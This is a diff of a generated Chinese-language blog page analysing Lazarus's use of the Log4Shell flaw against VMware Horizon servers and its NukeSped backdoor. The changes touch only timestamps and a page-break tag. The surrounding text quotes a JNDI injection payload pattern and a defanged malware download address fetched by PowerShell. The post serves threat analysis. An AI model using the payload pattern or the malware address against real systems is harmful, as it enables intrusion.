@@ -49,7 +49,7 @@
 <meta property="og:image" content="http://shxi.cc/post/c44584e3/718f617fa5a8ca90e733449b64a94647.png">
 <meta property="og:image" content="http://shxi.cc/post/c44584e3/e0456b28c8b017b4f48ca3c61dbc870d.png">
 <meta property="article:published_time" content="2023-10-18T06:28:51.000Z">
-<meta property="article:modified_time" content="2023-10-18T06:49:35.329Z">
+<meta property="article:modified_time" content="2023-10-18T06:58:31.836Z">
 <meta property="article:author" content="KenYang">
 <meta property="article:tag" content="Lazarus利用">
 <meta name="twitter:card" content="summary">
@@ -440,6 +440,9 @@ var _hmt = _hmt || [];
 		  
 		  <h1 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h1><p>&emsp;&emsp;2021年12月9日晚,基于Java的日志记录程序Log4j的一个远程执行漏洞(CVE-2021-44228)POC被公开。攻击者使用${}关键标识符触发JNDI注入漏洞,当程序将用户输入的数据进行日志记录时,即可触发此漏洞并成功利用此漏洞在目标服务器上执行任意代码。</p>
 <p>&emsp;&emsp;今年4月份,有安全研究人员发现Lazarus利用Log4jShell漏洞入侵VMWare Horizon服务器，攻击者使用类似于${jndi:Idap://example} 的payload然后启动powershell从<strong>hxxp://185.29.8.18/htory.exe</strong>下载恶意程序,该命令由ws_TomcatService.exe生成。</p>
+ 
+<span id="more"></span>
+
 <h1 id="2-详细分析"><a href="#2-详细分析" class="headerlink" title="2. 详细分析"></a>2. 详细分析</h1><h2 id="2-1-splwow64-exe"><a href="#2-1-splwow64-exe" class="headerlink" title="2.1 splwow64.exe"></a>2.1 splwow64.exe</h2><p>&emsp;&emsp;该恶意程序由攻击者在投递在未打安全补丁的VMWare Horizon服务器，伪装成微软的打印机相关程序splwow64.exe。</p>
 <p><img src="c44584e3/8a46542bbcd70903896bca01daa4d0bc.png"></p>
 <h2 id="2-2-NukeSped分析"><a href="#2-2-NukeSped分析" class="headerlink" title="2.2 NukeSped分析"></a>2.2 NukeSped分析</h2><p>&emsp;&emsp;NuKeSped是一种后门恶意程序,可以从C&amp;C服务器接收攻击者命令并执行接收到的命令。此次分析的样本为NukeSped的一个变种，从2020年来一直被Lazarus使用。</p>
@@ -1106,7 +1109,7 @@ var _hmt = _hmt || [];
 	
 	<br>
 	<strong class="update-time">最后更新：</strong>
-	2023年10月18日 14:49:35
+	2023年10月18日 14:58:31
 	
 	<!-- <br>
 	<strong class="article-titles">本文标题：</strong>
